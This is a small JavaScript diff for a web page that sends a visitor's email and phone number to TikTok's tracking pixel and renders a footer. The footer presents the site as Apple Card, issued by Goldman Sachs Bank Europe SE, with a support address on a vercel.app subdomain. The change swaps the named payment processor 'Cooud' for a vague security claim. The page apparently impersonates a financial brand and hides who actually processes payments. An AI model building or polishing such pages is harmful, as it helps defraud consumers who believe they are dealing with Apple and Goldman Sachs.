@@ -71,7 +71,7 @@
     var lead = loadLead();
     var payload = { external_id: externalId };
     if (lead.email) payload.email = String(lead.email).trim().toLowerCase();
-    var phone = normalizePhone(lead.telefone || lead.phone);
+    var phone = normalizePhone(lead.phone);
     if (phone) payload.phone_number = phone;
     if (window.ttq && window.ttq.identify) window.ttq.identify(payload);
   }
@@ -101,7 +101,7 @@
         user: {
           external_id: externalId,
           email: lead.email || '',
-          phone: lead.telefone || lead.phone || '',
+          phone: lead.phone || '',
         },
         page: {
           url: window.location.href,
@@ -208,7 +208,7 @@
       + '<a href="/cookies.html" style="color:' + linkColor + ';text-decoration:none;margin:0 6px">Cookies</a> · '
       + '<a href="mailto:support@apple-card-en.vercel.app" style="color:' + linkColor + ';text-decoration:none;margin:0 6px">Support</a></div>'
       + '<div>© 2026 Apple Card · Issued by Goldman Sachs Bank Europe SE</div>'
-      + '<div style="margin-top:4px">Payments processed by Cooud · 256-bit SSL</div>';
+      + '<div style="margin-top:4px">256-bit SSL secure payments</div>';
     document.body.appendChild(f);
   }
 
